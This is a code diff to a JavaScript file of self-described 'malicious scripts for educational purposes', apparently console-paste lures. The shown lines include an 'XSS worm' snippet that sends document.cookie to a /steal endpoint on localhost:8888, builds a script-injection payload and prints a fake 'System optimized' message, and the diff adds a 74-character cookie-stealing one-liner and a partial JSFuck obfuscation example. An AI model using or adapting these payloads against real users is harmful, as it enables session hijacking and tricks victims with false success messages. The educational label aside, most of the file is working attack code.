@@ -1,4 +1,4 @@
-// ⚠️ WARNING: These are MALICIOUS scripts for educational purposes only!
+// WARNING: These are MALICIOUS scripts for educational purposes only!
 
 
 // ============================================================
@@ -108,3 +108,18 @@ console.clear();console.log('%cERROR FIX UTILITY','color: red; font-size: 20px; 
 // (Won't work on all sites, but demonstrates the concept)
 
 (function(){fetch('http://localhost:8888/steal?cookie='+document.cookie+'&source=xss_worm');var textareas=document.querySelectorAll('textarea, input[type="text"]');var payload='<script>new Image().src="http://localhost:8888/steal?cookie="+document.cookie;</script>';console.log('%cAttempting to propagate...','color: orange;');console.log('Found '+textareas.length+' potential injection points');console.log('%c✓ System optimized','color: green;');})();
+
+// ============================================================
+// VERSION 11: ULTRA SHORT - 74 chars
+// ============================================================
+// Minimal version, no fake success message
+
+new Image().src='http://localhost:8888/steal?c='+document.cookie;
+
+// ============================================================
+// VERSION 10: JSFuck style (partial) - VERY LONG but completely unreadable
+// ============================================================
+// Using only: []()!+ characters (example shortened)
+// Full JSFuck would be 10,000+ chars! (full version in jsfuck.js)
+
+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]  // This spells "fa"... (too long for practical use)
